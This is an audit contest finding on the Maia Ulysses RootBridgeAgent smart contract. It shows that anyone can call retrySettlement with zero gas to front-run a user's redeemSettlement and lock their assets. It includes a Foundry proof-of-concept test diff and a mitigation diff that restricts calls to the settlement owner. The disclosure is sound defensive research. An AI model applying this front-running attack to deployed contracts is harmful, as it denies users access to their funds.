## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-03

# [`RootBridgeAgent.redeemSettlement` can be front-run using `RootBridgeAgent.retrySettlement` causing redeem DoS](https://github.com/code-423n4/2023-05-maia-findings/issues/869) 

# Lines of code

https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L268


# Vulnerability details

## Impact
Since [RootBridgeAgent.retrySettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L252) can be called by **anyone** for **any** settlement, a malicious actor can front-run an user trying to redeem his failed settlement via [RootBridgeAgent.redeemSettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L254-L268) by calling [RootBridgeAgent.retrySettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L252) with `_remoteExecutionGas = 0` in order to make sure that this settlement will also fail in the future.  

As a consequnce, the user's subsequent call to [RootBridgeAgent.redeemSettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L254-L268) [will revert](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L260-L261) (DoS) because the settlement was [already marked](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L577) with `SettlementStatus.Success` during the malicious actor's call to [RootBridgeAgent.retrySettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L252). Therefore the user is unable to redeem his assets.

## Proof of Concept
The following PoC modifies an existing test case to confirm the above claims resulting in:
* The settlement being marked with `SettlementStatus.Success`.
* DoS of [RootBridgeAgent.redeemSettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L254-L268) method for this settlement.
* **The user not being able to redeem his assets.**

Just apply the *diff* below and run the test with `forge test --match-test testRedeemSettlement`:

```diff
diff --git a/test/ulysses-omnichain/RootTest.t.sol b/test/ulysses-omnichain/RootTest.t.sol
index ea88453..ccd7ad2 100644
--- a/test/ulysses-omnichain/RootTest.t.sol
+++ b/test/ulysses-omnichain/RootTest.t.sol
@@ -1299,14 +1299,13 @@ contract RootTest is DSTestPlus {
         hevm.deal(_user, 1 ether);
 
         //Retry Settlement
-        multicallBridgeAgent.retrySettlement{value: 1 ether}(settlementNonce, 0.5 ether);
 
         settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce);
 
         require(settlement.status == SettlementStatus.Success, "Settlement status should be success.");
     }
 
-    function testRedeemSettlement() public {
+    function testRedeemSettlementFrontRunDoS() public {
         //Set up
         testAddLocalTokenArbitrum();
 
@@ -1389,15 +1388,25 @@ contract RootTest is DSTestPlus {
 
         require(settlement.status == SettlementStatus.Failed, "Settlement status should be failed.");
 
-        //Retry Settlement
-        multicallBridgeAgent.redeemSettlement(settlementNonce);
+        //Front-run redeem settlement with '_remoteExecutionGas = 0'
+        address _malice = address(0x1234);
+        hevm.deal(_malice, 1 ether);
+        hevm.prank(_malice);
+        multicallBridgeAgent.retrySettlement{value: 1 ether}(settlementNonce, 0 ether);
 
         settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce);
+        require(settlement.status == SettlementStatus.Success, "Settlement status should be success.");
 
-        require(settlement.owner == address(0), "Settlement should cease to exist.");
+        //Redeem settlement DoS cause settlement is marked as success
+        hevm.expectRevert(abi.encodeWithSignature("SettlementRedeemUnavailable()"));
+        multicallBridgeAgent.redeemSettlement(settlementNonce);
+
+        settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce);
+        require(settlement.owner != address(0), "Settlement should still exist.");
 
+        //User couldn't redeem funds
         require(
-            MockERC20(newAvaxAssetGlobalAddress).balanceOf(_user) == 150 ether, "Settlement should have been redeemed"
+            MockERC20(newAvaxAssetGlobalAddress).balanceOf(_user) == 0 ether, "Settlement should not have been redeemed"
         );
     }
 
```

## Tools Used
VS Code, Foundry

## Recommended Mitigation Steps
I suggest to only allow calls to [RootBridgeAgent.retrySettlement(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L243-L252) by the settlement owner:

```diff
diff --git a/src/ulysses-omnichain/RootBridgeAgent.sol b/src/ulysses-omnichain/RootBridgeAgent.sol
index 34f4286..4acef39 100644
--- a/src/ulysses-omnichain/RootBridgeAgent.sol
+++ b/src/ulysses-omnichain/RootBridgeAgent.sol
@@ -242,6 +242,14 @@ contract RootBridgeAgent is IRootBridgeAgent {
 
     /// @inheritdoc IRootBridgeAgent
     function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {
+        //Get deposit owner.
+        address depositOwner = getSettlement[_settlementNonce].owner;
+        if (
+            msg.sender != depositOwner && msg.sender != address(IPort(localPortAddress).getUserAccount(depositOwner))
+        ) {
+            revert NotSettlementOwner();
+        }
+
         //Update User Gas available.
         if (initialGas == 0) {
             userFeeInfo.depositedGas = uint128(msg.value);

```



## Assessed type

DoS